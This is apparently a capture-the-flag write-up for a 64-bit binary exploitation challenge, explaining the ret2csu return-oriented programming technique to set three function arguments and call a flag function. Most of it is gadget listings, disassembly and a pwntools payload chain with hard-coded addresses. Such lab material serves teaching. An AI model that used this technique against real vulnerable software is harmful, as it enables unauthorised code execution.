## Solution
Based on the source code, we need 3 arguments for the `flag` function. Simple right? (No.)

We can grab the gadgets for `a` & `b` arguments by doing the following:

```shell
$> ROPgadget --binary chall | grep -E "pop (rdi|rsi)"       
0x00000000004008c3 : pop rdi ; ret
0x00000000004008c1 : pop rsi ; pop r15 ; ret
```

However if we try to look for the last gadget (need `pop rdx ; ret`):

```shell
$> ROPgadget --binary chall | grep "pop rdx"      
# no results                                             
```

With the lack of `rdx` gadget, we can attempt a new technique called `ret2csu`.

## ret2csu

Let's look at the contents of `__libc_csu_init` function. This mainly handles stuff related to startup but we will be using it to get our 3rd argument

```shell
pwndbg> disassemble __libc_csu_init
Dump of assembler code for function __libc_csu_init:
   0x0000000000400860 <+0>:     push   r15
   0x0000000000400862 <+2>:     push   r14
   0x0000000000400864 <+4>:     mov    r15,rdx
   0x0000000000400867 <+7>:     push   r13
   0x0000000000400869 <+9>:     push   r12
   0x000000000040086b <+11>:    lea    r12,[rip+0x20059e]        # 0x600e10
   0x0000000000400872 <+18>:    push   rbp
   0x0000000000400873 <+19>:    lea    rbp,[rip+0x20059e]        # 0x600e18
   0x000000000040087a <+26>:    push   rbx
   0x000000000040087b <+27>:    mov    r13d,edi
   0x000000000040087e <+30>:    mov    r14,rsi
   0x0000000000400881 <+33>:    sub    rbp,r12
   0x0000000000400884 <+36>:    sub    rsp,0x8
   0x0000000000400888 <+40>:    sar    rbp,0x3
   0x000000000040088c <+44>:    call   0x4005a0 <_init>
   0x0000000000400891 <+49>:    test   rbp,rbp
   0x0000000000400894 <+52>:    je     0x4008b6 <__libc_csu_init+86>
   0x0000000000400896 <+54>:    xor    ebx,ebx
   0x0000000000400898 <+56>:    nop    DWORD PTR [rax+rax*1+0x0]
   0x00000000004008a0 <+64>:    mov    rdx,r15
   0x00000000004008a3 <+67>:    mov    rsi,r14
   0x00000000004008a6 <+70>:    mov    edi,r13d
   0x00000000004008a9 <+73>:    call   QWORD PTR [r12+rbx*8]
   0x00000000004008ad <+77>:    add    rbx,0x1
   0x00000000004008b1 <+81>:    cmp    rbp,rbx
   0x00000000004008b4 <+84>:    jne    0x4008a0 <__libc_csu_init+64>
   0x00000000004008b6 <+86>:    add    rsp,0x8
   0x00000000004008ba <+90>:    pop    rbx
   0x00000000004008bb <+91>:    pop    rbp
   0x00000000004008bc <+92>:    pop    r12
   0x00000000004008be <+94>:    pop    r13
   0x00000000004008c0 <+96>:    pop    r14
   0x00000000004008c2 <+98>:    pop    r15
   0x00000000004008c4 <+100>:   ret
```

We won't need the entire set of instructions, let's look at the ones we will use.

### Methodology

```shell
   0x00000000004008ba <+90>:    pop    rbx
   0x00000000004008bb <+91>:    pop    rbp
   0x00000000004008bc <+92>:    pop    r12
   0x00000000004008be <+94>:    pop    r13
   0x00000000004008c0 <+96>:    pop    r14
   0x00000000004008c2 <+98>:    pop    r15
   0x00000000004008c4 <+100>:   ret
```

From `0x4008ba` onwards, these are the set of registers, we can control. 

But which exactly do we need? Let's first figure out below.

## CSU

```shell
   0x00000000004008a0 <+64>:    mov    rdx,r15
   0x00000000004008a3 <+67>:    mov    rsi,r14
   0x00000000004008a6 <+70>:    mov    edi,r13d
   0x00000000004008a9 <+73>:    call   QWORD PTR [r12+rbx*8]
   0x00000000004008ad <+77>:    add    rbx,0x1
   0x00000000004008b1 <+81>:    cmp    rbp,rbx
   0x00000000004008b4 <+84>:    jne    0x4008a0 <__libc_csu_init+64>
```

In summary, `mov rdx, r15` helps us to set our 3rd argument. The rest we need to fulfil its requirements in order to let the program continue to the `ret` intruction at `0x4008c4`

### What do we need to fulfil

1. `call QWORD PTR [r12+rbx*8]`

This will jump to the memory address given. Only `r12` here is important since we can set `rbx` to `0` (direct jump). We would want to call a function that does not: - disrupt the program flow OR
- change any of the register values that are used for later

One such that we can call is the `__fini` function as it only contains the following instructions:

```shell
pwndbg> disassemble _fini
Dump of assembler code for function _fini:
   0x00000000004008d4 <+0>:     sub    rsp,0x8
   0x00000000004008d8 <+4>:     add    rsp,0x8
   0x00000000004008dc <+8>:     ret
```

However, this function is only used at runtime (cannot directly use offset), but we can use `&_DYNAMIC` to help us. `&_DYNAMIC` is used as part of the linking process in compilation.

```shell
pwndbg> x/10gx &_DYNAMIC
0x600e20:       0x0000000000000001      0x0000000000000001
0x600e30:       0x000000000000000c      0x00000000004005a0
0x600e40:       0x000000000000000d      0x00000000004008d4
0x600e50:       0x0000000000000019      0x0000000000600e10
0x600e60:       0x000000000000001b      0x0000000000000008
```

As you can see, our `_fini` is located at `0x600e48`.

2. `cmp rbp,rbx`

We need to ensure that we match the 2 register values, else it will re-run the set of intructions again:

```shell
0x00000000004008b4 <+84>:    jne    0x4008a0 <__libc_csu_init+64>
```

And we also observe this, which is good news:

```shell
0x00000000004008ad <+77>:    add    rbx,0x1
```

We can control the register values of `rbx` and `rbp`. So in this case, we just need to set `rbp` to `1`, and `rbx` to `0`.


### Recap

Now that we know what to fulfil, let's revisit this set of gadgets:

```shell
   0x00000000004008ba <+90>:    pop    rbx
   0x00000000004008bb <+91>:    pop    rbp
   0x00000000004008bc <+92>:    pop    r12
   0x00000000004008be <+94>:    pop    r13
   0x00000000004008c0 <+96>:    pop    r14
   0x00000000004008c2 <+98>:    pop    r15
   0x00000000004008c4 <+100>:   ret
```

Based on what we need, the ones we need are actually `rbp`, `r12` & `r15`.

`rbp` we will need to set it to value of `1` because of the `cmp` instruction in **Part 1**.

`r12` to set address to reference `_fini` in `&_DYNAMIC`

`r15` to move our 3rd argument into `rdx`.

We will need to setup these registers first, before we fulfil the requirements.

### Exploit

Let's set all the addresses we need first:

```python
from pwn import *

# p = remote("SERVER", PORT)
p = process("./chall")

# Find all the gadgets we need first

# 1st argument
pop_rdi = p64(0x4008c3) # pop rdi ; ret
 
# 2nd argument
pop_rsi = p64(0x4008c1) # pop rsi ; pop r15 ; ret

# 3rd argument 
csu1 = p64(0x4008ba)
_fini = p64(0x600e48)
csu2 = p64(0x4008a0)

# flag() function
win = p64(0x400717)
```

Now we need to set up the register values.

```python
# csu1
payload += csu1             # addr of pop rbx in csu
payload += p64(0)           # pop rbx
payload += p64(1)           # pop rbp (set to 1)
payload += _fini            # pop r12 (set to _fini)
payload += p64(0)           # pop r13
payload += p64(0)           # pop r14
payload += p64(0x56785678)  # pop r15 (set to 3rd argument)
```

Now we can run the earlier set of instructions in csu.

```python
payload += csu2
```

Since we managed to avoid te `jne` jump, it continues down to same set of instructions in `csu1`. We can just pad all of them.

```python
payload += p64(0)           # add rsp,0x8 
payload += p64(0)           # pop rbx
payload += p64(0)           # pop rbp
payload += p64(0)           # pop r12
payload += p64(0)           # pop r13
payload += p64(0)           # pop r14
payload += p64(0)           # pop r15
```

### Stack aligment

You might have realised that this exploit works locally, but not on remote. This is due to what we call stack misalignment. 
TLDR; your RSP is not 16-bytes aligned.

So what you can do is look for a `ret`/`pop rip` gadget and add it to the end of your exploit chain.

```python
payload += p64(0x4005b6)
```


## Solution
Refer to solve.py